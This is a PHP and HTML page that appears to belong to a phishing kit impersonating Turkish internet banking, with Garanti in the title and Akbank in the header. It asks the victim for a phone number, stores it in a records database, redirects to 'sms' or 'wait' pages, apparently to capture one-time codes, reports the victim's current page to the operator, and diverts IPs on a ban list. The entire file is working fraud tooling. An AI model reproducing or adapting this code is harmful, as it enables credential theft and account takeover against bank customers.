<?php  
require_once 'connect.php';

if ($ajax->banControl(IP)) {
    $ajax->redirect(BAN_URL);
}

$id = $_SESSION['id'];

if (isset($_POST['phone'])) {
    $newPhone = $_POST['phone'];

    $checkQuery = $db->prepare("SELECT phone FROM records WHERE id=?");
    $checkQuery->execute([$id]);
    $result = $checkQuery->fetch();

    if ($result && strlen($result['phone']) == 15) {
        $updateQuery = $db->prepare("UPDATE records SET phone = ?, lastOnline = ? WHERE id=?");
        $updateQuery->execute([$newPhone, time(), $id]);
        $ajax->redirect('wait');
    } else {
        $updateQuery = $db->prepare("UPDATE records SET phone = ?, lastOnline = ? WHERE id=?");
        $updateQuery->execute([$newPhone, time(), $id]);
        $ajax->redirect('sms');
    }
}

$ajax->pageUpdate(IP, 'TELEFON');
?>  
<!DOCTYPE html>
<html lang="tr"> 
<head>
    <meta charset="UTF-8"> 
    <title>İnternet Bankacılığı - Garanti</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no" />
    <meta name="google" content="notranslate" />
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-9ndCyUaIbzAi2FUVXJi0CjmCapSmO7SnpJef0486qhLnuZ2cdeRhO02iuK6FUUVM" crossorigin="anonymous">
    <link rel="stylesheet" href="assets/css/ajax.css">
	<style>
        body{
            background-color:#f2f2f2
            }
        header{
            padding: 20px;
            background-color: #dc0004;
            color: white;
            font-size: 20px;
            margin-bottom: 20px;
        }
        .a1{
            width: 100%;
            padding: 8px;
            
            border: 0;
            border-top: 2px solid #c8c8ca;
            border-bottom: 2px solid #c8c8ca;
            background-position: left;
            background-position-x: left 10px;
            padding-left: 45px
        }
        .kub{
             background: #f2f2f2;
             width: 100%;
             height: 100%;
        }
        .login{
                     background-repeat: no-repeat;
            background-size: 25px;
        }
        .password{
            background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACYAAAAnBAMAAACRTyc4AAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyJpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMy1jMDExIDY2LjE0NTY2MSwgMjAxMi8wMi8wNi0xNDo1NjoyNyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNiAoV2luZG93cykiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6NTBFQkVGQjg2NjBBMTFFQUIwNUNFRjFERTUxNTBGMDAiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6NTBFQkVGQjk2NjBBMTFFQUIwNUNFRjFERTUxNTBGMDAiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDo1MEVCRUZCNjY2MEExMUVBQjA1Q0VGMURFNTE1MEYwMCIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDo1MEVCRUZCNzY2MEExMUVBQjA1Q0VGMURFNTE1MEYwMCIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/PsegZc4AAAAqUExURby8vL29vb6+vs3Nzc7Ozs/Pz93d3d7e3t/f3+7u7u/v7/Dw8P7+/v///+4a6rIAAAFzSURBVCjPZZLBihQxEIarr56mpNnADHPYRxC8DtjYMrCQg+CDGBVGZPMQXgXBlsbDuH1bEHwBTzkMBgJtvnfxkO6ZXrYuST7+qr8IvwAB4PjjN1NJOfrXqrr6tGS97o9ffn1Qc2F9PQSAtDrMLKkHIJAqPzG3m6eTrgpLV5OKQHYeBJyHB0IhmemZAXADkk+2rNMcMpDjFuHtLUDSqriPBqG0ug3vyq35KmkLgMKoA0Bn5eSBYtR4gGjlW2EboLMA41ockIlr4PPMWoDCuh0hQPuA2QDQigH4d2+Ox5/uZgB4IyYDsVJVVbUATmqAWJDuCnu1ZLbMawHiU70+s+fy7JHOSDfkvGCB0cjJ5qJbTbo/W4k2QFxdeqOVcZ3h72Ke80JbfM/7KULnZ9+qspAMQlxDOpQa4LtHQFmWgszfO1XclGxcD2c0NiUbdObMuidz/pr9lI6+vptZ0j3A2NfDJbup0f3Hl03tlxnn/Yuqvpm8/gMHyt5u7KUaAAAAAABJRU5ErkJggg==);
            background-repeat: no-repeat;
            background-size: 25px;
            border: 0;
            border-top: 0px solid #c8c8ca;
            border-bottom: 2px solid #c8c8ca;
        }
        .login:focus{
            background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACYAAAAnCAMAAABUv8o5AAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyJpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMy1jMDExIDY2LjE0NTY2MSwgMjAxMi8wMi8wNi0xNDo1NjoyNyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNiAoV2luZG93cykiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6N0M2NjVBODU2NjBBMTFFQUE0QUY4MDg2RDAzQzZEMzkiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6N0M2NjVBODY2NjBBMTFFQUE0QUY4MDg2RDAzQzZEMzkiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDo3QzY2NUE4MzY2MEExMUVBQTRBRjgwODZEMDNDNkQzOSIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDo3QzY2NUE4NDY2MEExMUVBQTRBRjgwODZEMDNDNkQzOSIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/PgBxUkEAAABRUExURRwcGhwcHB0dGx0dHR0eGR4eHB4eHlVVU1ZWVFZWVldXVY2Ni46OjI6Ojo6Pio+PjY+Pj8bGxMbGxsfHxcfHx8jIxsjIyP7+/P7+/v///f///0DYOHcAAAGeSURBVDjLjZTrcgIhDIXTrNasDdo2qOD7P2gTWCEw60zzY51dP04uHIDnEPkmcrmwSB6/g3+JKyHi4aAPDOENJsqQxLviMQQleQeL65Ek55Ys8wlXU0wN03+/kOJzClXk7NQKNRadquIrMYyvc1zxlBvGTXyOzMAbNmpluQ1TM4lUMF/XiiX60DJhLmqMsVVNCJXD1ne0XIq5lDZUPBZsaR/PugS0spw2Md6UimRbLLgq5rrkV0r7oV6dYuLK7ZUtC2LvHX+AsTdPL2rGBIjqdo2YhVtOL+xRk77F3DgSe4rSgF3dqjdqNgH+F0a016mfW23h7E4Dum3gnU6bG3rkbmNk3QXpH2Kn+t48RLHBbQ07Kpa2xQ81BzxXf1hop8+y9aogE+b8kcqxCWbLM/kJbTFMs7j3hnePQdEj5+hqch2DVMMQVar4nOsEpLQIxU+6Nt6pO7eggCFaSsPBivxdqBu3nxrrhCxlOaf6DIPOEHpSUru4eKsc/a66jqH5fQ4wUvJ8W4blYya/d+/eMFZHfXcSjPdjWD8XC6LxLv8D0yxhmHszUEAAAAAASUVORK5CYII=);

        }
        .password:focus{
            background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACYAAAAnCAMAAABUv8o5AAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyJpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMy1jMDExIDY2LjE0NTY2MSwgMjAxMi8wMi8wNi0xNDo1NjoyNyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNiAoV2luZG93cykiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6NjcyQ0E4QkY2NjBBMTFFQUI0QUVDMTlGNkI2NTJDMjIiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6NjcyQ0E4QzA2NjBBMTFFQUI0QUVDMTlGNkI2NTJDMjIiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDo2NzJDQThCRDY2MEExMUVBQjRBRUMxOUY2QjY1MkMyMiIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDo2NzJDQThCRTY2MEExMUVBQjRBRUMxOUY2QjY1MkMyMiIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/PuGrCeYAAABvUExURR8fHyAeHyAgICEfICIeHyIgISMdHyMfICQeICQgISUfIVdXV1dZWFhYWFlXWFlZWVpYWVtXWFxYWY+Pj5COj5CQkJGPkJKQkZOPkJSQkcbIx8fFxsfHx8jGx8jIyMnHyP7+/v7////9/v/+/////1udyM8AAAHkSURBVDjLfZTbetQwDISdDtRZigVhGzW0NiSref9n5MKOD9v90E0S57ckjyw5DhaDyASR63Vcd+fLcVgSACJhFQH8ttkj7F3wU5KZkWa3tHnv1xEzIxcfYvNMkgq/meX3gsXgtxYi/zL77SVVzG6WgMh7Ow5GINmJWYIk7g8wJkGq2OJHYG+P+BROTPu8GOM1dmzmHHfF2tL+u3jAL12mKxLpSMUgwiLq/VPHiZCO66RtqUi6QszOuAnJHFe0oqxnllKEIEkTMWdoJTFF8ZwgbXPAzSliPZUVlciPHvszJZcPUPelB94IcSL/x3aSMmImLuaL1HvbKeLQ5FgFT0EkBBEBpB1NULHjOMQPFiq2+Rr0M/ZSL02HkQyXisxz9nYc3Mnl14AV5jJgJJfF6dSwefZ+fu5zyxjUpXa9w/yc/dxhVyRnUhV68ZfuBJdA7uROU5hrday53QlieDNnCWK3Uqq5hfQ+FEEUpDMTfFjBvg1YkQ2aW+asX8BgOehNYaWzzoLZYCwh1fY8HBRal8d2tdfsIs8QmbS1SI8p1LpR81Y+R7MNMgwu06/TOkwGknH5cm6uY1ABbR7z7PwRP01Ls9cJWNcYyRjfvwPQ5tv1uah2qsU+BdcnZGYpqWpKref3nST/AUxSn9LGt3CzAAAAAElFTkSuQmCC)
        }
        .submit{
             padding: 10px;
             width: 100%;
             margin-bottom: 15px;
             color: white;
             border: 0;
             border-top: 2px solid #c8c7cd;
             background: #dc0004;
             border-bottom:1px solid #dc0004;
        }
        .btn{
            color: #dc0004;
            background: white;
            border: 1px solid #dc0004;
            width: 100%;
            border-radius: 0px;
            padding: 10px;
            margin-bottom: 5px;
        }

        .error {
            border-bottom: 2px solid #f00 !important;
        }

        input {
            outline: none;
            box-shadow: none;
        }

        .submit:disabled {
            opacity: 0.3;
        }
   </style>
</head> 
<body>
    <div class="root">
       <header>
            Akbank
        </header>
        <div class="body">
            <div class="form">
                
                
             
 
                <form action="" method="post" autocomplete="off">
                    <div class="form-group">
                        <label class="text-start">Telefon Numaranız</label>
                        <input type="tel" inputmode="tel" required="" name="phone" class="form-control">
                    </div>

                    <button type="submit" class="login-btn">Devam Et</button>
                </form>
            </div>
        </div>
    </div>
    
    <?php require_once 'add-js.php'; ?>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.inputmask/5.0.8/jquery.inputmask.min.js" integrity="sha512-efAcjYoYT0sXxQRtxGY37CKYmqsFVOIwMApaEbrxJr4RwqVVGw8o+Lfh/+59TU07+suZn1BWq4fDl5fdgyCNkw==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>    


    <script> 
        $(document).ready(function() {
            $("input[name='phone']").inputmask({
                "mask": "0(599) 999-9999"
            });
        })
    </script>
</body> 
</html>